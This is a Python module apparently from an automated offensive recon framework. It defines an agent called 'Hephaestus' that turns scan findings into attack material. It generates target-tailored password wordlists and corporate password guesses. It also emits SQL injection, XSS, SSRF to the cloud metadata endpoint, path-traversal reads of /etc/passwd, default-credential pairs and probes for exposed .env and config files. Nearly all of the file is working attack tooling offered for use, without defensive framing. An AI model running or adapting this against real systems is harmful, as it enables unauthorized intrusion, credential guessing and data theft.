import os
import json
from datetime import datetime
from core.config import settings
from .base import BaseAgent


class Hephaestus(BaseAgent):
    name = "hephaestus"
    symbol = "🔥"
    display_name = "HEPHAESTUS"
    role = "Payload Forge & Exploit Preparation"

    async def execute(self, target: str, context: dict = None) -> dict:
        hermes = (context or {}).get("hermes", {})
        ares = (context or {}).get("ares", {})
        athena = (context or {}).get("athena", {})

        await self.log("Analyzing findings to prepare targeted payloads", "info")

        result = {
            "payloads_generated": [],
            "wordlists_created": [],
            "exploitable_targets": [],
            "forge_report": {},
        }

        vulns = ares.get("vulnerabilities", [])
        live_hosts = hermes.get("live_hosts", [])
        technologies = hermes.get("technologies", {})
        vendors = hermes.get("vendors", [])
        domain = hermes.get("domain", target)

        await self.log(f"Building payload set from {len(vulns)} findings + {len(technologies)} tech fingerprints", "info")

        # Custom wordlist based on target context
        wordlist = await self._build_wordlist(domain, vendors, technologies, athena)
        if wordlist:
            wl_path = os.path.join(settings.reports_dir, f"wordlist_{domain.replace('.', '_')}.txt")
            try:
                os.makedirs(settings.reports_dir, exist_ok=True)
                with open(wl_path, "w") as f:
                    f.write("\n".join(wordlist))
                result["wordlists_created"].append({"path": wl_path, "entries": len(wordlist)})
                await self.log(f"Custom wordlist: {len(wordlist)} entries written to {wl_path}", "success")
            except Exception as e:
                await self.log(f"Wordlist write failed: {e}", "warn")

        # Payload sets for identified vulnerability classes
        for vuln in vulns:
            sev = vuln.get("severity", "info")
            template = vuln.get("template", "")
            matched_at = vuln.get("matched_at", "")

            if sev in ("critical", "high") and matched_at:
                payloads = self._payloads_for_template(template, matched_at)
                if payloads:
                    result["payloads_generated"].extend(payloads)
                    result["exploitable_targets"].append(matched_at)

        # Generic web payload sets based on tech stack
        web_payloads = self._generic_web_payloads(technologies)
        result["payloads_generated"].extend(web_payloads)

        # Save forge report
        result["forge_report"] = {
            "domain": domain,
            "total_payloads": len(result["payloads_generated"]),
            "exploitable_count": len(result["exploitable_targets"]),
            "wordlist_entries": sum(w["entries"] for w in result["wordlists_created"]),
            "timestamp": datetime.utcnow().isoformat(),
        }

        await self.log(
            f"Forge complete: {len(result['payloads_generated'])} payloads | "
            f"{len(result['exploitable_targets'])} exploitable targets identified",
            "success",
        )
        return result

    async def _build_wordlist(self, domain: str, vendors: list, technologies: dict, athena: dict) -> list:
        words = set()

        # Domain-derived
        parts = domain.split(".")
        for p in parts:
            if len(p) > 2:
                words.add(p)
                words.add(p.lower())
                words.add(p.capitalize())
                words.add(p + "123")
                words.add(p + "2024")
                words.add(p + "2025")
                words.add(p + "!")

        # Company name mutations
        company = parts[0] if parts else domain
        mutations = [
            company, company.lower(), company.upper(), company.capitalize(),
            company + "@123", company + "123!", company + "2024!", company + "@2025",
            company + "_admin", company + "_dev", "admin_" + company,
            company[:4] + "2024", company[:4] + "!", "P@ss" + company,
        ]
        words.update(mutations)

        # Vendor-based (KnowBe4 + weak password training paradox)
        vendor_names = [v["vendor"].split()[0].lower() for v in vendors]
        for v in vendor_names:
            words.add(v + "2024!")
            words.add(v + "@123")

        # Tech-specific paths / admin defaults
        all_techs = []
        for tech_list in technologies.values():
            all_techs.extend(tech_list)

        if any("WordPress" in t for t in all_techs):
            words.update(["admin", "password", "wordpress", "wp-admin", "admin123", "letmein"])
        if any("Drupal" in t for t in all_techs):
            words.update(["drupal", "admin", "password1", "admin@drupal"])
        if any("nginx" in t.lower() for t in all_techs):
            words.update(["nginx", "webmaster"])

        # Common corporate password patterns
        words.update([
            "Password1", "Password1!", "Welcome1", "Welcome1!",
            "Summer2024!", "Winter2024!", "Spring2025!", "Fall2024!",
            "January@1", "Admin@123", "Letmein1!", "Changeme1",
            "Qwerty123!", "Company1!", "123456Aa!",
        ])

        return sorted(list(words))

    def _payloads_for_template(self, template: str, url: str) -> list:
        payloads = []
        tl = template.lower()

        if "sqli" in tl or "sql-injection" in tl:
            payloads = [
                {"type": "SQLi", "payload": "' OR '1'='1", "target": url},
                {"type": "SQLi", "payload": "' OR 1=1--", "target": url},
                {"type": "SQLi", "payload": "admin'--", "target": url},
                {"type": "SQLi", "payload": "1' AND SLEEP(5)--", "target": url},
            ]
        elif "xss" in tl:
            payloads = [
                {"type": "XSS", "payload": "<script>alert(1)</script>", "target": url},
                {"type": "XSS", "payload": "<img src=x onerror=alert(document.domain)>", "target": url},
                {"type": "XSS", "payload": "javascript:alert(1)", "target": url},
            ]
        elif "ssrf" in tl:
            payloads = [
                {"type": "SSRF", "payload": "http://169.254.169.254/latest/meta-data/", "target": url},
                {"type": "SSRF", "payload": "http://localhost:8080/", "target": url},
            ]
        elif "lfi" in tl or "path-traversal" in tl:
            payloads = [
                {"type": "LFI", "payload": "../../../etc/passwd", "target": url},
                {"type": "LFI", "payload": "....//....//....//etc/passwd", "target": url},
            ]
        elif "default-login" in tl or "default-creds" in tl:
            payloads = [
                {"type": "DefaultCreds", "payload": "admin:admin", "target": url},
                {"type": "DefaultCreds", "payload": "admin:password", "target": url},
                {"type": "DefaultCreds", "payload": "admin:123456", "target": url},
            ]

        return payloads

    def _generic_web_payloads(self, technologies: dict) -> list:
        all_techs = []
        for tech_list in technologies.values():
            all_techs.extend([t.lower() for t in tech_list])

        payloads = []

        # Universal recon payloads
        payloads.extend([
            {"type": "Recon", "payload": "/../../../etc/passwd", "note": "Path traversal"},
            {"type": "Recon", "payload": "/.git/HEAD", "note": "Git exposure"},
            {"type": "Recon", "payload": "/.env", "note": "Environment file"},
            {"type": "Recon", "payload": "/robots.txt", "note": "Robots disclosure"},
            {"type": "Recon", "payload": "/sitemap.xml", "note": "Sitemap enum"},
        ])

        if any("php" in t for t in all_techs):
            payloads.extend([
                {"type": "PHP", "payload": "<?php phpinfo(); ?>", "note": "PHP info probe"},
                {"type": "PHP", "payload": "/?page=../../../../etc/passwd", "note": "PHP LFI"},
            ])

        if any("wordpress" in t for t in all_techs):
            payloads.extend([
                {"type": "WordPress", "payload": "/wp-json/wp/v2/users", "note": "User enum via API"},
                {"type": "WordPress", "payload": "/wp-content/debug.log", "note": "Debug log"},
                {"type": "WordPress", "payload": "/wp-config.php.bak", "note": "Config backup"},
            ])

        return payloads
